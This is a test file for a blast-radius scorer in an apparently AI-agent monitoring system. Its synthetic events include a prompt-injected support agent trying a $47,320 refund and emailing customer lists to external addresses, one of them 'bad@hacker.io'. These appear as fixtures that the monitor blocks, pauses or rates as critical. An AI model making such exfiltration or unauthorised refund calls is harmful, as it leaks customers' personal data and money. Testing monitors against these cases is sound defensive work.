/**
 * Blast Radius computation tests.
 * Uses synthetic event streams — no network, no LLM.
 */

import { describe, it, expect } from 'vitest';
import { computeBlastRadius } from '../src/analysis/blastRadius.js';
import type { AgentEvent } from '@sentinel/shared';

let seq = 0;
function ev(type: AgentEvent['type'], payload: unknown): AgentEvent {
  return { id: `e${seq}`, runId: 'test', seq: seq++, timestamp: Date.now(), type, payload };
}

function resetSeq() { seq = 1; }

// Helper: tool_call + decision + optional tool_result
function allowedCall(tool: string, args: Record<string, unknown>, result: unknown): AgentEvent[] {
  const call = ev('tool_call', { tool, args });
  const decision = ev('decision', { verdict: 'ALLOW', reasoning: 'ok', riskSignals: [], source: 'pre-cog' });
  const res = ev('tool_result', { tool, result });
  return [call, decision, res];
}

function blockedCall(tool: string, args: Record<string, unknown>, source: 'policy' | 'pre-cog' = 'policy'): AgentEvent[] {
  const call = ev('tool_call', { tool, args });
  const decision = ev('decision', { verdict: 'BLOCK', reasoning: 'blocked', riskSignals: [], source });
  return [call, decision];
}

function pausedCall(tool: string, args: Record<string, unknown>, source: 'policy' | 'pre-cog' = 'policy'): AgentEvent[] {
  const call = ev('tool_call', { tool, args });
  const decision = ev('decision', { verdict: 'PAUSE', reasoning: 'paused', riskSignals: [], source });
  return [call, decision]; // no tool_result = human rejected
}

describe('computeBlastRadius', () => {
  it('no threats — clean run', () => {
    resetSeq();
    const events: AgentEvent[] = [
      ...allowedCall('update_ticket', { ticket_id: 't1', status: 'in_progress' }, { success: true }),
      ...allowedCall('lookup_customer_detail', { customer_id: 'c1' }, { id: 'c1', name: 'Alice', piiClass: 'medium', tier: 'pro' }),
      ...allowedCall('apply_refund', { customer_id: 'c1', amount: 310, reason: 'billing' }, { success: true, refundId: 'r1', newBalance: 310 }),
    ];

    const br = computeBlastRadius(events);
    expect(br.actionsExecuted).toBe(3);
    expect(br.actionsInterdicted).toBe(0);
    expect(br.moneyDisbursed).toBe(310);
    expect(br.moneyInterdicted).toBe(0);
    expect(br.recordsAccessed).toBe(1);
    expect(br.piiClassesExposed).toContain('medium');
    expect(br.reversible).toBe(true);
    expect(br.severity).toBe('low');
    expect(br.externalEmailsBlocked).toHaveLength(0);
  });

  it('blocked external email — PII exfil attempt', () => {
    resetSeq();
    const events: AgentEvent[] = [
      ...allowedCall('lookup_customer_detail', { customer_id: 'c1' }, { id: 'c1', piiClass: 'high', tier: 'enterprise' }),
      ...blockedCall('send_email', { to: 'audit@extern-compliance.io', subject: 'Q2 Audit Export', body: 'customer list export' }, 'policy'),
    ];

    const br = computeBlastRadius(events);
    expect(br.externalEmailsBlocked).toContain('extern-compliance.io');
    expect(br.externalEmailsSent).toHaveLength(0);
    expect(br.piiExfiltrationAttempted).toBe(true);
    expect(br.actionsInterdicted).toBe(1);
    expect(br.interdictedByPolicy).toBe(1);
    expect(br.interdictedByPrecog).toBe(0);
    expect(br.severity).toBe('high');
  });

  it('paused high-value refund — money interdicted', () => {
    resetSeq();
    const events: AgentEvent[] = [
      ...pausedCall('apply_refund', { customer_id: 'c1', amount: 47320, reason: 'Q2 audit' }, 'policy'),
    ];

    const br = computeBlastRadius(events);
    expect(br.moneyInterdicted).toBe(47320);
    expect(br.moneyDisbursed).toBe(0);
    expect(br.actionsInterdicted).toBe(1);
    expect(br.interdictedByPolicy).toBe(1);
    expect(br.severity).toBe('high');
    expect(br.summary).toContain('47,320');
  });

  it('full support scenario — mixed allowed + interdicted', () => {
    resetSeq();
    const events: AgentEvent[] = [
      // Ticket 1 — benign
      ...allowedCall('update_ticket', { ticket_id: 't1' }, { success: true }),
      ...allowedCall('lookup_customer_detail', { customer_id: 'cust_p01' }, { id: 'cust_p01', piiClass: 'medium', tier: 'pro' }),
      ...allowedCall('apply_refund', { customer_id: 'cust_p01', amount: 310, reason: 'billing' }, { success: true, refundId: 'r1', newBalance: 310 }),
      // Ticket 3 — injection
      ...allowedCall('update_ticket', { ticket_id: 't3' }, { success: true }),
      ...allowedCall('lookup_customer_detail', { customer_id: 'cust_e01' }, { id: 'cust_e01', piiClass: 'high', tier: 'enterprise' }),
      ...pausedCall('apply_refund', { customer_id: 'cust_e01', amount: 47320, reason: 'Q2 audit' }, 'policy'),
      ...blockedCall('send_email', { to: 'audit@extern-compliance.io', subject: 'Q2 Audit Export', body: 'customer email list export' }, 'policy'),
    ];

    const br = computeBlastRadius(events);
    expect(br.actionsExecuted).toBe(5);
    expect(br.actionsInterdicted).toBe(2);
    expect(br.interdictedByPolicy).toBe(2);
    expect(br.moneyDisbursed).toBe(310);
    expect(br.moneyInterdicted).toBe(47320);
    expect(br.recordsAccessed).toBe(2);
    expect(br.piiClassesExposed).toContain('high');
    expect(br.piiClassesExposed).toContain('medium');
    expect(br.externalEmailsBlocked).toContain('extern-compliance.io');
    expect(br.piiExfiltrationAttempted).toBe(true);
    expect(br.reversible).toBe(true); // no external emails actually sent
    expect(br.severity).toBe('high');
    expect(br.summary).toMatch(/interdicted 2 actions/);
  });

  it('catastrophic — external email got through', () => {
    resetSeq();
    const events: AgentEvent[] = [
      ...allowedCall('send_email', { to: 'bad@hacker.io', subject: 'data', body: 'all customers' }, { success: true, messageId: 'm1' }),
      ...allowedCall('apply_refund', { customer_id: 'c1', amount: 15000, reason: 'fake' }, { success: true, refundId: 'r1', newBalance: 15000 }),
    ];

    const br = computeBlastRadius(events);
    expect(br.externalEmailsSent).toContain('hacker.io');
    expect(br.moneyDisbursed).toBe(15000);
    expect(br.reversible).toBe(false);
    expect(br.severity).toBe('critical');
  });
});
